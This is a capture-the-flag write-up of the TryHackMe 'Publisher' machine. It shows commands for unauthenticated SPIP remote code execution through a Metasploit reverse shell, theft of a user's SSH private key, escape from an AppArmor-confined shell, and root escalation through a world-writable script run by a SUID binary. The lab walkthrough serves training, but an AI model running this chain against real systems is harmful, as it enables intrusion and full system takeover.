# TryHackMe - Publisher (Write-Up)

_6 min read · February 28, 2026 · by qs18_

---

## Entry Log

In this mini-blog, I’ll be showing you the walkthrough for [**Publisher**](https://tryhackme.com/room/publisher) machine from [**TryHackMe**](https://tryhackme.com/).

- Goal: Obtain User and Root Flag
- Difficulty: Easy
- Machine Author: josemlwdf

---

## Scanning for Open Ports

The machine IP address in my case is **10.48.188.166**.

As usual:

```bash
nmap -T4 -p- 10.48.188.166
sudo nmap -sCV -p 22,80 10.48.188.166
```

![Nmap Output](./img/thm-publisher/Nmap-output.png)

From the scan result, I noticed that:

- SSH (port 22) is open.
- HTTP (port 80) is open.

As usual, I browsed the site first.

![Publisher: Website](./img/thm-publisher/web.png)

There was nothing interesting on the main page, and I didn’t find anything useful in the page source either.

However, I noticed the site's using [SPIP](https://www.spip.net/en_rubrique25.html) as its CMS.

---

## Futher Enumeration on the Website

I used [**FFuF**](https://www.kali.org/tools/ffuf/) to enumerate the site.

```bash
ffuf -u http://10.48.188.166/FUZZ -w /usr/share/wordlists/dirb/big.txt -s
```

```output
.htpasswd
.htaccess
images
server-status
spip
```

I accessed `/spip`.

![Publisher: Website /spip](./img/thm-publisher/web-spip.png)

Nothing interesting here as well.

I continued enumerating inside `/spip`.

```bash
ffuf -u http://10.48.188.166/spip/FUZZ -w /usr/share/wordlists/dirb/big.txt -s
```

```output
.htpasswd
.htaccess
LICENSE
config
ecrire
local
prive
squelettes-dist
tmp
vendor
```

After exploring the directories, I found out that:

- `/ecrire` is a login page.
- It is using **SPIP version 4.2.0** (as stated in `/local/config.txt`).

---

## Exploitation

I searched for an exploit related to SPIP 4.2.0 and found [SPIP v4.2.0 - Remote Code Execution (Unauthenticated)](https://www.exploit-db.com/exploits/51536) on Exploit-DB.

Then I launched [**MSFconsole**](https://www.kali.org/tools/metasploit-framework/).

```bash
msfconsole -q
search spip
use exploit/multi/http/spip_rce_form
```

![SPIP_RCE_form Options](./img/thm-publisher/spip-msfconsole.png)

I set the required options:

```bash
set RHOST 10.49.131.185
set TARGETURI /spip
set LHOST 192.168.223.226
run
```

![Rev Shell](./img/thm-publisher/rev-shell.png)

And I received a shell.

---

## Post-Exploitation

After gaining the shell, I found **user flag** in `/home/think` directory.

```bash
pwd
cd ../..
ls -al
cat user.txt
```

![User Flag](./img/thm-publisher/user-flag.png)

I also confirmed that 'think' is a valid user by checking `/etc/passwd`.

Next, I navigated to `.ssh` directory and found a private key.

```bash
cd .ssh
cat id_rsa
```

![id_rsa](./img/thm-publisher/id-rsa.png)

I copied the key to my local machine, changed its permission and logged in via SSH.

```bash
chmod 600 id_rsa
ssh think@10.49.131.185 -i id_rsa
```

Login successful.

---

## Privilege Escalation

After loggin in as 'think', I performed my usual privesc checklist.

I checked for SUID binaries:

![SUID Results](./img/thm-publisher/suid.png)

I discovered a custom binary which is `run_container`.

I checked the binary:

```bash
strings /usr/sbin/run_container
```

I noticed it references `/opt/run_container.sh`.

I then checked the script's permissions.

```output
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```

The script is world-writable. I then navigated to `/opt` and modify the script by adding:

```bash
bash -p
```

However, permission was denied when I tried to save it even though the file permissions showed writable.

That behavior was unusual. I suspected some kind of restriction.

---

## Discovering AppArmor Restriction

I checked my shell:

```bash
cat /etc/passwd | grep think
```

```output
think:x:1000:1000:,,,:/home/think:/usr/sbin/ash
```

I noticed that my shell is `/usr/sbin/ash`, not `/bin/bash`.

Anddd I got stuck here. Then I clicked the hint in TryHackMe, and it mentioned AppArmor. After that, I did some research to understand how it works.

I learned that [AppArmor](https://apparmor.net/) is a Linux security module that restricts program capabilities using security profiles. The profiles are typically stored in `/etc/apparmor.d`.

So first I checked whether it's enabled:

```bash
aa-enabled
```

```output
Yes
```

Next, I navigated to `/etc/apparmor.d`:

```bash
cd /etc/apparmor.d
ls -al
```

![AppArmor](./img/thm-publisher/apparmor.png)

`usr.sbin.ash` is there, so I read it.

```output
# Deny access to certain directories
deny /opt/ r,
deny /opt/** w,
deny /tmp/** w,
deny /dev/shm w,
deny /var/tmp w,
deny /home/** w,
/usr/bin/** mrix,
/usr/sbin/** mrix,
```

This means:

- The `ash` shell is confined by AppArmor.
- It cannot write to `/opt`, `/tmp`, `/home`, etc.
- It can only execute binaries inside `/usr/bin` and `/usr/sbin`.

That explains why I couldn't modify `/opt/run_container.sh` even though permissions allowed it.

---

## Escaping the AppArmor Jail

Since the restriction was applied specifically to `/usr/sbin/ash`, I needed to spawn a new shell that was not confined by this AppArmor profile.

I copied `bash` into `/dev/shm` and executed it:

```bash
cp /bin/bash /dev/shm
/dev/shm/bash -p
```

This worked because:

- The AppArmor profile was attached to `/usr/sbin/ash`.
- `/dev/shm/bash` does not have an AppArmor profile.
- Therefore, the new bash process was not confined.

Now I was no longer restricted by the `ash` profile.

---

## Modifying the Script

I modified the `/opt/run_container.sh` again:

```bash
bash -p
```

Then I executed the SUID binary:

```bash
/usr/sbin/run_container
```

Finally, I became root.

Then I navigated to `/root` and retrieved the **root flag**.

```bash
cd /root
cat root.txt
```

![Root Flag](./img/thm-publisher/root-flag.png)

Bomba! Settleee.

---

## Session Terminated

From this machine, I learned how to:

- identify SPIP CMS and its version
- enumerate system users and retrieve SSH private key
- understand AppArmor confinement and its restrictions
- bypass AppArmor by spawning an unconfined bash shell
- modify writable script executed by SUID binary

Thank you for reading and see you next time!
